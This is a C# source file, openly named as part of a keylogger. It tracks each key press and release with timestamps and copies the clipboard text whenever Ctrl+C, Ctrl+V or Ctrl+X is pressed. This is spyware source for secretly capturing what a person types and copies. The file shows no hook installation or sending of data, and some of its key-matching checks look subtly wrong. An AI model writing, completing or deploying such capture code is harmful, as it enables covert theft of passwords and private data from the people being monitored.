using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;

namespace KeyLogger
{
    public class KeyboardAnalyzer
    {
        public event Action<IList<int>, IList<KeyPress>> OnPress;

        private IDictionary<int, KeyPress> KeysDown { get; set; } = new Dictionary<int, KeyPress>();

        public void KeyDown(int vCode, Keys key)
        {
            if(!KeysDown.ContainsKey(vCode))
                KeysDown.Add(vCode, new KeyPress(vCode, key));
        }

        public void KeyUp(int vCode, Keys key)
        {
            if (KeysDown.ContainsKey(vCode))
            {
                KeysDown[vCode].To = DateTime.UtcNow;
                var pressed = KeysDown.ToList();
                KeysDown.Remove(vCode);

                OnPress?.Invoke(pressed.Select(p => p.Key).ToList(), pressed.Select(p => p.Value).ToList());
            }
        }

        public void CopyClipboard(IList<KeyPress> keys)
        {
            if (keys.Any(k => k.Key == Keys.RControlKey || k.Key == Keys.LControlKey))
            {
                var key = keys.FirstOrDefault(k => (k.Key & Keys.C) == Keys.C);
                if (key != null)
                {
                    // Copy
                    key.DataType = KeyPressDataType.Clipboard | KeyPressDataType.Copy | KeyPressDataType.Text;
                    key.Data = Clipboard.GetText();
                }

                key = keys.FirstOrDefault(k => (k.Key & Keys.V) == Keys.V);
                if (key != null)
                {
                    // Paste
                    key.DataType = KeyPressDataType.Clipboard | KeyPressDataType.Paste | KeyPressDataType.Text;
                    key.Data = Clipboard.GetText();
                }

                key = keys.FirstOrDefault(k => (k.Key & Keys.X) == Keys.X);
                if (key != null)
                {
                    // Paste
                    key.DataType = KeyPressDataType.Clipboard | KeyPressDataType.Cut | KeyPressDataType.Text;
                    key.Data = Clipboard.GetText();
                }
            }
        }
    }

    public class KeyPress
    {
        public KeyPress(in int code, Keys key)
        {
            From = DateTime.UtcNow;
            Code = code;
            Key = key;
        }

        public DateTime From { get; set; }
        public DateTime To { get; set; }

        public int Code { get; set; }
        public Keys Key { get; set; }

        public KeyPressDataType? DataType { get; set; }
        public object Data { get; set; }
    }

    [Flags]
    public enum KeyPressDataType
    {
        Copy = 1,
        Paste = 2,
        Cut = 4,

        Clipboard = 16,

        Text = 128,
        Image = 256,
        Audio = 512,
        Data = 1024
    }
}